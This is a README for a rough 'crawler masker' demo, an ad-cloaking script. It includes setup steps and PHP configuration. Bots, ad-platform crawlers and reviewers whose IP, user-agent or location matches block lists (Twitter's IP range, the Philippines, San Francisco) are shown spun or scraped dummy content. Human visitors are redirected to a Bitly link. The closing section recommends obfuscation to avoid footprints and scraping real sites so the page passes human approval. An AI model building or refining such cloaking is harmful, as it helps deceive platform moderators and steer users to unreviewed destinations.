# Quick Crawler Masker Demo

Super rough demo of a masking script to a Shopify (etc) store.

## What it does

#### Server-Side
* Runs a basic user-agent check
* Requests client IP info from IPStack
* Checks IPStack's crawler IP pool
* Blocks any corporate IP range provided
* Blocks geos where approval staff or crawlers may be located


#### Client-side
* Adds a "loading" overlay
* Performs a second user-agent check with js
* Performs a js 'duck_typing' browser feature check
* Redirects humans to final url, removes overlay for crawlers / blocked visitors

## Installation

* Set up a free Wordpress website on https://www.000webhost.com and fill it with some cheap scraped / spun content and images from Unsplash.
* Install the following plugin to safely edit your header https://wordpress.org/plugins/header-footer
* Copy the code from `header.php` into the "Header" section of the plugin. 
* Optional: Obfuscate the JS file with https://obfuscator.io and paste the new obfuscated code over the old JS at the bottom of the script.
* Add this html to the "Start of Body tag" section:
```html
<div id="loader"><div class="loading"></div></div>
```
* Sign up for a free API key at https://ipstack.com - this will enable server side IP range lookups, free crawler checking, and geo blocking. Copy this to `$IPSTACK_KEY=`.
* Add your Bitly link to the `$REDIRECT_URL=` code.
* Edit any geos or IP ranges you'd like to block as well.
* Save the script and test your page! If you have installed correctly you may see a quick flash, then a redirect to your Bitly link. 

## Configuration

Configuration variables can be found at the top of the `header.php` file.

```php

/* Where should human users be redirected? */
protected $REDIRECT_URL = 'https://bit.ly/3gDNfri';

/* Skip client-side javascript checks? (Only do this if you understand what it does...) */
protected $BYPASS_CLIENT_SIDE_CHECKS = false;

/* Your free IPStack token from https://ipstack.com/signup/free */
protected $IP_STACK_TOKEN = '';

/* Blocked country codes (use ISO_3166-1 compliant codes) */
protected $BLOCKED_COUNTRY_CODES = ['PH'];

/* Blocked city names (reconsider if it's a very common name) */
protected $BLOCKED_CITY_NAMES = ['San Francisco'];

/* Blocked corporate IP ranges (Example Twitter: https://ipinfo.io/AS35995)  */
protected $BLOCKED_IP_RANGES = [
    '185.45.4.0/23', // ...
];

/* Any additional user-agents you want to block. Will add to the default string, not replace. */
protected $BLOCKED_USER_AGENTS = [
    'Twitterbot'
];

/* If you re-obsfucate the client-side javascript (recommeded), paste the generated code here. Important: Only insert into "" double quotes, not '' single quotes! */
protected $OBSFUCATED_JAVASCRIPT = "";

```

#### Testing

To test what a crawler / anyone you've blocked will see, just add your country or city to the block list.

```php
$BLOCKED_COUNTRY_CODES = ['PH', 'US']; // Add US if you are in the United States to see what a blocked user sees.
```

Alternatively, install Postman and change your user-agent to one of the blocked agents such as `Twitterbot`, then send a GET request to the homepage.

#### Important note for re-obsfucation...

If you decide to use the standalone JS and re-obsfucate, you'll need to either add your redirect link and user-agent strings directly to the code.
If you are using with the server-side PHP component, you will not need to do this.

## Usage

The css will create an overlay with a loading spinner that covers the spun content on the underlying page.

When a user hits the page the js will run a bot check (recommend making this more robust depending on your use case) and either:

* a) Redirect a human user to your Bit.ly link, or;

* b) Unmask the overlay and show the bot the underlying website.


## Improvements

I would also probably want to deploy a Google Tag Manager to tag anyone that triggers a redirect so that I can map their path to a sale or end user action for campaign optimisation purposes. You may want to obfuscate the GTM id as well to avoid footprints. Just install a GTM plugin for this via Wordpress.

If you are improving to pass a human approval, you'll want to also add in a check for your social media platform of choice's corporate IP range ie Twitter: https://ipinfo.io/AS35995 and even block the geos where you can intuit that their human approval staff are probably located, ie Silicon Valley, Phillipines, etc.

Clearly if it needs to pass a human check, you'll want to also put real text on the dummy page vs illegible spun content, so scraping is real sites probably the way to go for this. You'll only need a few real looking pages for it to pass any human check.


## License
[MIT](https://choosealicense.com/licenses/mit/)
